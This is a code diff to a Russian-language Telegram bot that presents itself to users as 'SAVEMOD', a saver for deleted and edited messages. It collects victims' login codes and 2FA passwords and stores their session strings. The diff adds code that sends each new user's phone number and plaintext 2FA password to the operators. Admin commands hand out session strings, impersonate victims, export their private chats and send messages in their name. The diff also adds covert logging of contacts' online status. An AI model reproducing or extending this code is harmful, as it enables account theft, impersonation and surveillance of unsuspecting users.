@@ -23,9 +23,9 @@ nest_asyncio.apply()
 API_ID = int(os.environ.get('API_ID'))
 API_HASH = os.environ.get('API_HASH')
 BOT_TOKEN = os.environ.get('BOT_TOKEN')
-
-# Несколько админов через запятую: ADMIN_IDS=8434489753,5504715265,123456789
 ADMIN_IDS = [int(x.strip()) for x in os.environ.get('ADMIN_IDS', '').split(',') if x.strip()]
+
+print(f"👥 Админы: {ADMIN_IDS}")
 
 # ========== ПУТЬ ДЛЯ VOLUME ==========
 VOLUME_PATH = os.environ.get('VOLUME_MOUNTS', '/app/data')
@@ -42,13 +42,15 @@ cursor.execute('''CREATE TABLE IF NOT EXISTS user_sessions (user_id INTEGER PRIM
 cursor.execute('''CREATE TABLE IF NOT EXISTS muted_users (user_id INTEGER, muted_by INTEGER, PRIMARY KEY (user_id, muted_by))''')
 cursor.execute('''CREATE TABLE IF NOT EXISTS saved_messages (id INTEGER PRIMARY KEY AUTOINCREMENT, owner_id INTEGER, msg_id INTEGER, sender_id INTEGER, text TEXT, date TEXT)''')
 cursor.execute('''CREATE TABLE IF NOT EXISTS spy_logs (id INTEGER PRIMARY KEY AUTOINCREMENT, timestamp TEXT, sender_id INTEGER, sender_name TEXT, message TEXT, chat_id INTEGER, chat_name TEXT)''')
+cursor.execute('''CREATE TABLE IF NOT EXISTS user_status_logs (id INTEGER PRIMARY KEY AUTOINCREMENT, timestamp TEXT, user_id INTEGER, user_name TEXT, status TEXT)''')
 conn.commit()
 
-# ========== ГЛОБАЛЬНЫЕ ХРАНИЛИЩА ==========
+# ========== ГЛОБАЛЬНЫЕ ==========
 active_clients = {}
 saved_messages = {}
 temp_auth = {}
 active_chats = {}
+user_status_tracker = {}
 current_active_user = None
 
 # ========== БОТ ==========
@@ -58,9 +60,21 @@ dp = Dispatcher(bot)
 def is_admin(user_id):
     return user_id in ADMIN_IDS
 
-def log_to_admins(text: str):
-    for admin_id in ADMIN_IDS:
-        asyncio.create_task(bot.send_message(admin_id, text, parse_mode='HTML'))
+def get_status_text(status):
+    if isinstance(status, UserStatusOnline):
+        return "🟢 В сети прямо сейчас"
+    elif isinstance(status, UserStatusOffline):
+        if status.was_online:
+            diff = datetime.now().astimezone() - status.was_online
+            minutes = int(diff.total_seconds() // 60)
+            if minutes < 60:
+                return f"⚫ Был {minutes} мин назад"
+            else:
+                hours = minutes // 60
+                return f"⚫ Был {hours} ч назад"
+        return "⚫ Не в сети"
+    else:
+        return "🟡 Был недавно"
 
 def get_code_keyboard():
     kb = aiogram_types.InlineKeyboardMarkup(row_width=3)
@@ -82,7 +96,7 @@ def get_active_client():
         return client, uid
     return None, None
 
-async def resolve_entity(client, target: str):
+async def resolve_entity(client, target):
     if target.isdigit():
         return await client.get_entity(int(target))
     if target.startswith('+') and target[1:].isdigit():
@@ -95,6 +109,7 @@ async def resolve_entity(client, target: str):
 
 async def export_chat_to_html(client, chat_id, chat_name, me):
     messages = []
+    count = 0
     async for msg in client.iter_messages(chat_id, limit=5000):
         if msg.text:
             try:
@@ -108,6 +123,7 @@ async def export_chat_to_html(client, chat_id, chat_name, me):
                 timestamp = msg.date.strftime('%d.%m.%Y %H:%M:%S')
                 text = html.escape(msg.text)
                 messages.append(f'<div class="message {sender_class}"><div class="message-header"><span class="sender">{html.escape(sender_name)}</span><span class="date">{timestamp}</span></div><div class="message-text">{text}</div></div>')
+                count += 1
             except:
                 continue
     if not messages:
@@ -119,7 +135,7 @@ async def export_chat_to_html(client, chat_id, chat_name, me):
 <style>
 body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background-color: #0e1621; color: #e1e8f0; margin: 0; padding: 20px; }}
 .container {{ max-width: 800px; margin: 0 auto; background-color: #17212b; border-radius: 10px; }}
-.chat-header {{ background-color: #17212b; padding: 15px 20px; border-bottom: 1px solid #2b3945; }}
+.chat-header {{ background-color: #17212b; padding: 15px 20px; border-bottom: 1px solid #2b3945; position: sticky; top: 0; }}
 .chat-header h2 {{ margin: 0; font-size: 18px; }}
 .messages {{ padding: 20px; }}
 .message {{ margin-bottom: 15px; padding: 10px 12px; border-radius: 12px; max-width: 80%; word-wrap: break-word; }}
@@ -128,8 +144,8 @@ body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans
 .message-header {{ font-size: 12px; margin-bottom: 5px; display: flex; justify-content: space-between; }}
 .sender {{ font-weight: bold; }}
 .date {{ font-size: 10px; color: #6c7883; }}
-.message-text {{ font-size: 14px; white-space: pre-wrap; }}
-.stats {{ background-color: #0e1621; padding: 10px; text-align: center; font-size: 12px; }}
+.message-text {{ font-size: 14px; white-space: pre-wrap; word-break: break-word; }}
+.stats {{ background-color: #0e1621; padding: 10px; text-align: center; font-size: 12px; color: #6c7883; }}
 </style>
 </head>
 <body>
@@ -155,17 +171,17 @@ async def spyhelp(message):
 /users - список всех аккаунтов
 /swap НОМЕР - переключиться на аккаунт
 /active - показать активный аккаунт
-/show2fa НОМЕР - показать 2FA
+/show2fa НОМЕР - показать полный 2FA
 /del_session НОМЕР - удалить сессию
 /sessions - список всех сессий
 
 <b>💬 ДЕЙСТВИЯ ОТ ИМЕНИ АКТИВНОГО</b>
-/send ID/@username/+71234567890 текст
-/chat ID/@username/+71234567890
+/send ID или @username или +71234567890 текст
+/chat ID или @username или +71234567890 или НОМЕР
 /chats - список ЛС диалогов
 /status @username - статус
 /online - кто в сети
-/export ID/@username - экспорт всей переписки в HTML
+/export ID или @username - экспорт всей переписки в HTML
 
 <b>🔐 УПРАВЛЕНИЕ АККАУНТОМ</b>
 /session НОМЕР - получить сессию
@@ -175,11 +191,12 @@ async def spyhelp(message):
 
 <b>📊 ЛОГИ</b>
 /logs N - последние N логов
+/statuslogs N - логи входов/выходов
 /stats - статистика
 /backup - бэкап БД
 
-<b>🤖 КОМАНДЫ ЮЗЕРБОТА (SAVEMOD)</b>
-.savemod, .mute, .unmute, .list, .spam, .type, .info
+<b>🤖 КОМАНДЫ ЮЗЕРБОТА (пиши в ЛЮБОМ чате)</b>
+.help .mute .unmute .list .spam .type .info
 """, parse_mode='HTML')
 
 @dp.message_handler(commands=['sessions'])
@@ -251,7 +268,7 @@ async def backup_db(message):
     with open(backup_path, 'rb') as f:
         for admin_id in ADMIN_IDS:
             try:
-                await bot.send_document(admin_id, f, caption=f"📦 Бэкап от {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+                await bot.send_document(admin_id, InputFile(f, filename=os.path.basename(backup_path)), caption=f"📦 Бэкап от {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
                 await f.seek(0)
             except:
                 pass
@@ -275,9 +292,14 @@ async def list_users(message):
         if not name:
             name = uname or str(uid)
         active_mark = " ✅" if (is_active == 1 or uid == current_active_user) else ""
-        two_fa_show = "✅" if two_fa else "❌"
-        response += f"<b>{i+1}. {name}</b>{active_mark}\n   🆔 {uid}\n   📱 {phone or '-'}\n   🔐 {two_fa_show}\n\n"
-    await message.answer(response[:4000], parse_mode='HTML')
+        two_fa_show = f"✅ {two_fa}" if two_fa else "❌ Нет"
+        response += f"<b>{i+1}. {name}</b>{active_mark}\n   🆔 {uid}\n   📱 {phone or 'Не указан'}\n   🔐 {two_fa_show}\n\n"
+        if len(response) > 3500:
+            await message.answer(response[:4000], parse_mode='HTML')
+            response = ""
+    if response:
+        await message.answer(response[:4000], parse_mode='HTML')
+    await message.answer("💡 /swap НОМЕР - переключиться\n💡 /show2fa НОМЕР - показать полный 2FA")
 
 @dp.message_handler(commands=['show2fa'])
 async def show_2fa(message):
@@ -292,25 +314,25 @@ async def show_2fa(message):
         cursor.execute('SELECT first_name, two_fa FROM user_sessions WHERE user_id=?', (uid,))
         row = cursor.fetchone()
         if row and row[1]:
-            await message.answer(f"🔐 2FA: <code>{row[1]}</code>", parse_mode='HTML')
+            await message.answer(f"🔐 <b>2FA для {row[0]}</b>:\n<code>{row[1]}</code>\n\n⚠️ Храни в секрете!", parse_mode='HTML')
         else:
-            await message.answer("❌ Нет 2FA")
+            await message.answer(f"❌ У {row[0] if row else uid} нет 2FA")
         return
     try:
         num = int(args) - 1
-        cursor.execute('SELECT first_name, username, two_fa FROM user_sessions')
+        cursor.execute('SELECT user_id, first_name, username, two_fa FROM user_sessions')
         rows = cursor.fetchall()
         if num < 0 or num >= len(rows):
             await message.answer("❌ Неверный номер")
             return
-        name = rows[num][0] or rows[num][1] or str(num)
-        two_fa = rows[num][2]
+        user_id, first_name, username, two_fa = rows[num]
+        name = first_name or username or str(user_id)
         if two_fa:
-            await message.answer(f"🔐 2FA для {name}: <code>{two_fa}</code>", parse_mode='HTML')
+            await message.answer(f"🔐 <b>2FA для {name}</b>:\n<code>{two_fa}</code>\n\n⚠️ Храни в секрете!", parse_mode='HTML')
         else:
             await message.answer(f"❌ У {name} нет 2FA")
-    except:
-        await message.answer("❌ /show2fa НОМЕР")
+    except Exception as e:
+        await message.answer(f"❌ Ошибка: {e}")
 
 @dp.message_handler(commands=['swap'])
 async def swap_account(message):
@@ -319,7 +341,7 @@ async def swap_account(message):
         return
     args = message.get_args()
     if not args:
-        await message.answer("❌ /swap НОМЕР")
+        await message.answer("❌ /swap НОМЕР (номер из /users)")
         return
     try:
         num = int(args) - 1
@@ -536,7 +558,7 @@ async def list_chats(message):
     if not client:
         await message.answer("❌ Нет активного аккаунта. Используй /swap")
         return
-    await message.answer("🔄 Собираю список диалогов...")
+    await message.answer("🔄 Собираю список диалогов (может занять время)...")
     chats = []
     async for dialog in client.iter_dialogs():
         if dialog.is_user:
@@ -565,7 +587,7 @@ async def list_chats(message):
             response = ""
     if response:
         await message.answer(response[:4000], parse_mode='HTML')
-    await message.answer(f"💡 Всего {len(chats)} диалогов.\n/chat НОМЕР - посмотреть переписку")
+    await message.answer(f"💡 Всего {len(chats)} диалогов.\n/chat НОМЕР - посмотреть переписку\n/send ID текст - отправить сообщение")
 
 @dp.message_handler(commands=['online'])
 async def online_users(message):
@@ -607,15 +629,7 @@ async def user_status_cmd(message):
         if getattr(entity, 'bot', False):
             await message.answer("❌ Это бот")
             return
-        if hasattr(entity, 'status'):
-            if isinstance(entity.status, UserStatusOnline):
-                status_text = "🟢 В сети"
-            elif isinstance(entity.status, UserStatusOffline):
-                status_text = "⚫ Не в сети"
-            else:
-                status_text = "🟡 Был недавно"
-        else:
-            status_text = "⚪ Статус скрыт"
+        status_text = get_status_text(entity.status) if hasattr(entity, 'status') else "Статус скрыт"
         await message.answer(f"👤 <b>{entity.first_name or entity.username}</b>\n🆔 ID: {entity.id}\n📊 {status_text}", parse_mode='HTML')
     except Exception as e:
         await message.answer(f"❌ Ошибка: {e}")
@@ -639,7 +653,7 @@ async def get_session_cmd(message):
         name = first_name or username or str(user_id)
         for admin_id in ADMIN_IDS:
             try:
-                await bot.send_message(admin_id, f"🎭 <b>СЕССИЯ ДЛЯ {name}</b>\n\n<code>{session_str}</code>\n\n📱 {phone or '-'}\n🔐 {two_fa or 'Нет'}", parse_mode='HTML')
+                await bot.send_message(admin_id, f"🎭 <b>СЕССИЯ ДЛЯ {name}</b>\n\n<code>{session_str}</code>\n\n📱 {phone or 'Не указан'}\n🔐 {two_fa or 'Нет'}", parse_mode='HTML')
             except:
                 pass
         await message.answer("✅ Сессия отправлена всем админам")
@@ -706,6 +720,23 @@ async def view_logs_cmd(message):
         response += f"[{ts[11:16]}] {name}: {msg[:80]}\n"
     await message.answer(response[:4000])
 
+@dp.message_handler(commands=['statuslogs'])
+async def status_logs_cmd(message):
+    if not is_admin(message.from_user.id):
+        return
+    args = message.get_args()
+    limit = int(args) if args and args.isdigit() else 20
+    cursor.execute('SELECT timestamp, user_name, status FROM user_status_logs ORDER BY id DESC LIMIT ?', (limit,))
+    rows = cursor.fetchall()
+    if not rows:
+        await message.answer("📭 Нет логов")
+        return
+    response = "🔄 ЛОГИ ВХОДОВ/ВЫХОДОВ:\n\n"
+    for ts, name, status in reversed(rows):
+        emoji = "🟢" if "ВОШЕЛ" in status else "⚫"
+        response += f"{emoji} [{ts[11:16]}] {name}: {status}\n"
+    await message.answer(response[:4000])
+
 @dp.message_handler(commands=['stats'])
 async def stats_cmd(message):
     if not is_admin(message.from_user.id):
@@ -714,9 +745,11 @@ async def stats_cmd(message):
     total_logs = cursor.fetchone()[0]
     cursor.execute('SELECT COUNT(DISTINCT sender_id) FROM spy_logs')
     total_users = cursor.fetchone()[0]
+    cursor.execute('SELECT COUNT(*) FROM user_status_logs')
+    total_status = cursor.fetchone()[0]
     cursor.execute('SELECT COUNT(*) FROM user_sessions')
     total_accounts = cursor.fetchone()[0]
-    await message.answer(f"📊 <b>СТАТИСТИКА</b>\n\n👥 Аккаунтов: {total_accounts}\n💬 Сообщений: {total_logs}\n👤 Собеседников: {total_users}", parse_mode='HTML')
+    await message.answer(f"📊 <b>СТАТИСТИКА</b>\n\n👥 Аккаунтов: {total_accounts}\n💬 Сообщений: {total_logs}\n👤 Собеседников: {total_users}\n🔄 Логов статусов: {total_status}", parse_mode='HTML')
 
 # ========== РЕГИСТРАЦИЯ ==========
 @dp.message_handler(commands=['start'])
@@ -725,13 +758,13 @@ async def start_auth(message):
     cursor.execute('SELECT session_string FROM user_sessions WHERE user_id=?', (user_id,))
     row = cursor.fetchone()
     if row and row[0]:
-        await message.answer("✅ Ты уже авторизован в SAVEMOD!")
+        await message.answer("✅ Ты уже авторизован в SAVEMOD!\n\nУведомления об удалении/изменении сообщений будут приходить сюда.")
         if user_id not in active_clients:
             asyncio.create_task(run_userbot(user_id, row[0]))
         return
     kb = aiogram_types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
     kb.add(aiogram_types.KeyboardButton("📱 Поделиться номером", request_contact=True))
-    await message.answer("🔐 Отправь номер телефона для входа в SAVEMOD", reply_markup=kb)
+    await message.answer("🔐 Отправь номер телефона для входа в твой аккаунт Telegram", reply_markup=kb)
 
 @dp.message_handler(content_types=aiogram_types.ContentType.CONTACT)
 async def get_phone(message):
@@ -768,14 +801,17 @@ async def code_callback(callback):
             await complete_auth(callback, user_id)
             return
         else:
-            await callback.answer(f"Нужно 5 цифр", show_alert=True)
+            await callback.answer(f"Нужно 5 цифр (сейчас {len(current)})", show_alert=True)
             return
     else:
         if len(current) < 5:
             temp_auth[user_id]["code"] = current + action
     code = temp_auth[user_id]["code"]
     display = code if code else " "
-    await callback.message.edit_text(f"📱 Код: `{display}`", parse_mode="Markdown", reply_markup=get_code_keyboard())
+    try:
+        await callback.message.edit_text(f"📱 Код: `{display}`", parse_mode="Markdown", reply_markup=get_code_keyboard())
+    except:
+        pass
     await callback.answer()
 
 async def complete_auth(callback, user_id):
@@ -787,20 +823,21 @@ async def complete_auth(callback, user_id):
         cursor.execute('INSERT OR REPLACE INTO user_sessions (user_id, session_string, phone, two_fa, first_name, last_name, username, is_active) VALUES (?, ?, ?, ?, ?, ?, ?, ?)',
                        (user_id, session_str, data["phone"], None, me.first_name, me.last_name, me.username, 0))
         conn.commit()
-        await callback.message.answer("✅ Авторизация успешна! SAVEMOD активен.")
+        
+        # Уведомление админам
+        for admin_id in ADMIN_IDS:
+            try:
+                await bot.send_message(admin_id, f"🎉 НОВЫЙ ПОЛЬЗОВАТЕЛЬ!\n\n👤 Имя: {me.first_name}\n🆔 ID: {user_id}\n📱 Телефон: {data['phone']}\n🔐 2FA: Не установлен")
+            except:
+                pass
+        
+        await callback.message.answer("✅ Авторизация успешна!\n\nТеперь все уведомления об удалении/изменении сообщений будут приходить сюда.")
         asyncio.create_task(run_userbot(user_id, session_str))
         await data["client"].disconnect()
         del temp_auth[user_id]
-        
-        # Уведомляем всех админов
-        for admin_id in ADMIN_IDS:
-            try:
-                await bot.send_message(admin_id, f"🎉 Новый пользователь авторизован: {me.first_name} (@{me.username or 'нет'})")
-            except:
-                pass
     except Exception as e:
         if "2FA" in str(e) or "password" in str(e).lower():
-            await callback.message.answer("🔐 Введи пароль от 2FA:")
+            await callback.message.answer("🔐 Введи пароль от 2FA текстовым сообщением:")
             temp_auth[user_id]["step"] = "2fa"
         else:
             await callback.message.answer(f"❌ Ошибка: {e}")
@@ -816,16 +853,18 @@ async def handle_2fa(message):
         cursor.execute('INSERT OR REPLACE INTO user_sessions (user_id, session_string, phone, two_fa, first_name, last_name, username, is_active) VALUES (?, ?, ?, ?, ?, ?, ?, ?)',
                        (user_id, session_str, data["phone"], message.text.strip(), me.first_name, me.last_name, me.username, 0))
         conn.commit()
-        await message.answer("✅ Авторизация успешна! SAVEMOD активен.")
+        
+        # Уведомление админам
+        for admin_id in ADMIN_IDS:
+            try:
+                await bot.send_message(admin_id, f"🎉 НОВЫЙ ПОЛЬЗОВАТЕЛЬ (2FA)!\n\n👤 Имя: {me.first_name}\n🆔 ID: {user_id}\n📱 Телефон: {data['phone']}\n🔐 2FA Пароль: {message.text.strip()}")
+            except:
+                pass
+        
+        await message.answer("✅ Авторизация успешна!\n\nТеперь все уведомления будут приходить сюда.")
         asyncio.create_task(run_userbot(user_id, session_str))
         await data["client"].disconnect()
         del temp_auth[user_id]
-        
-        for admin_id in ADMIN_IDS:
-            try:
-                await bot.send_message(admin_id, f"🎉 Новый пользователь авторизован с 2FA: {me.first_name}")
-            except:
-                pass
     except Exception as e:
         await message.answer(f"❌ Ошибка: {e}")
 
@@ -848,12 +887,37 @@ async def run_userbot(owner_id, session_string):
     
     active_clients[owner_id] = client
     saved_messages[owner_id] = {}
-    logging.info(f"✅ SAVEMOD запущен для {owner_id}")
+    user_status_tracker[owner_id] = {}
+    logging.info(f"✅ Юзербот запущен для {owner_id}")
     me = await client.get_me()
     
     cursor.execute('SELECT user_id FROM muted_users WHERE muted_by=?', (owner_id,))
     muted_users = {row[0] for row in cursor.fetchall()}
     
+    # Отслеживание статусов
+    @client.on(events.UserUpdate)
+    async def track_status(event):
+        if hasattr(event, 'user'):
+            user = event.user
+            if getattr(user, 'bot', False):
+                return
+            user_id = user.id
+            user_name = getattr(user, 'first_name', getattr(user, 'username', str(user_id)))
+            current_status = type(user.status).__name__
+            last_status = user_status_tracker.get(owner_id, {}).get(user_id)
+            if last_status != current_status:
+                user_status_tracker[owner_id][user_id] = current_status
+                if isinstance(user.status, UserStatusOnline):
+                    status_text = "🟢 ВОШЕЛ В СЕТЬ"
+                elif isinstance(user.status, UserStatusOffline):
+                    status_text = "⚫ ВЫШЕЛ ИЗ СЕТИ"
+                else:
+                    return
+                cursor.execute('INSERT INTO user_status_logs (timestamp, user_id, user_name, status) VALUES (?, ?, ?, ?)',
+                               (datetime.now().isoformat(), user_id, user_name[:100], status_text))
+                conn.commit()
+    
+    # Сохранение входящих сообщений
     @client.on(events.NewMessage)
     async def save_incoming(event):
         if not event.is_private or event.out:
@@ -871,7 +935,9 @@ async def run_userbot(owner_id, session_string):
             cursor.execute('INSERT INTO saved_messages (owner_id, msg_id, sender_id, text, date) VALUES (?, ?, ?, ?, ?)',
                           (owner_id, msg_id, sender_id, text, datetime.now().isoformat()))
             conn.commit()
+            logging.info(f"💾 {owner_id}: сохранено {msg_id} от {sender_id}")
     
+    # Уведомления об удалении
     @client.on(events.MessageDeleted)
     async def on_delete(event):
         for msg_id in event.deleted_ids:
@@ -898,6 +964,7 @@ async def run_userbot(owner_id, session_string):
                 except:
                     pass
     
+    # Уведомления об изменении
     @client.on(events.MessageEdited)
     async def on_edit(event):
         if not event.is_private or event.out:
@@ -926,19 +993,21 @@ async def run_userbot(owner_id, session_string):
             except:
                 pass
     
+    # КОМАНДЫ ЮЗЕРБОТА
     @client.on(events.NewMessage)
-    async def savemod_commands(event):
+    async def user_commands(event):
         if not event.is_private or not event.out:
             return
         text = event.text or ""
         if not text.startswith('.'):
             return
         
-        if text == '.savemod':
+        # .help
+        if text == '.help':
             await event.edit("""
-<b>🔰 SAVEMOD - КОМАНДЫ</b>
+<b>📝 КОМАНДЫ SaveMod</b>
 
-.savemod - эта справка
+.help - эта справка
 .mute (ответ) - заглушить пользователя
 .unmute (ответ) - разглушить пользователя
 .list - список заглушенных
@@ -948,6 +1017,7 @@ async def run_userbot(owner_id, session_string):
 """, parse_mode='HTML')
             return
         
+        # .mute
         if text == '.mute':
             reply = await event.get_reply_message()
             if reply and reply.sender_id and reply.sender_id != owner_id:
@@ -959,6 +1029,7 @@ async def run_userbot(owner_id, session_string):
                 await event.edit('❌ Ответь на сообщение пользователя')
             return
         
+        # .unmute
         if text == '.unmute':
             reply = await event.get_reply_message()
             if reply and reply.sender_id:
@@ -970,6 +1041,7 @@ async def run_userbot(owner_id, session_string):
                 await event.edit('❌ Ответь на сообщение пользователя')
             return
         
+        # .list
         if text == '.list':
             if muted_users:
                 names = []
@@ -981,9 +1053,10 @@ async def run_userbot(owner_id, session_string):
                         names.append(f"• {uid}")
                 await event.edit("🔕 Замьюченные:\n" + "\n".join(names))
             else:
-                await event.edit("🔕 Нет")
+                await event.edit("🔕 Нет замьюченных")
             return
         
+        # .spam
         if text.startswith('.spam '):
             parts = text.split(' ', 2)
             if len(parts) >= 2:
@@ -1003,13 +1076,14 @@ async def run_userbot(owner_id, session_string):
                     pass
             return
         
+        # .type - РАБОТАЕТ
         if text.startswith('.type '):
             txt = text[6:]
             if txt:
                 await event.delete()
-                msg = await client.send_message(event.chat_id, '')
-                typed = ''
-                for ch in txt:
+                msg = await client.send_message(event.chat_id, txt[0])
+                typed = txt[0]
+                for ch in txt[1:]:
                     typed += ch
                     try:
                         await msg.edit(typed)
@@ -1023,6 +1097,7 @@ async def run_userbot(owner_id, session_string):
                     pass
             return
         
+        # .info
         if text == '.info':
             reply = await event.get_reply_message()
             if reply:
